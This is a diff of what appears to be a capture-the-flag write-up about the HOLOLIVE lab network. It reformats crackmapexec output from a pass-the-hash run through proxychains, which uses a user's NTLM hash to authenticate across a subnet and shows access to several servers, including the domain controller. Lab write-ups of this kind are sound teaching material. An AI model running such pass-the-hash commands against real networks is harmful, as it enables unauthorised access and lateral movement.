@@ -474,7 +474,8 @@ SID               : S-1-5-21-471847105-3603022926-1728018720-1132
 └─$ proxychains crackmapexec smb 10.200.112.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9
 
 SMB         10.200.112.31   445    S-SRV01          [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 (Pwn3d!)
-[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.112.102:445 SMB         10.200.112.35   445    PC-FILESRV01     [+] holo.live\watamet:d8d41e6cf762a8c77776a1843d4141c9
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.112.102:445
+SMB         10.200.112.35   445    PC-FILESRV01     [+] holo.live\watamet:d8d41e6cf762a8c77776a1843d4141c9
 SMB         10.200.112.30   445    DC-SRV01         [+] holo.live\watamet:d8d41e6cf762a8c77776a1843d414
 ```
 - Results on crackmapexec show that we have access to PC-FILESRV01 and DC-SRV01 also.
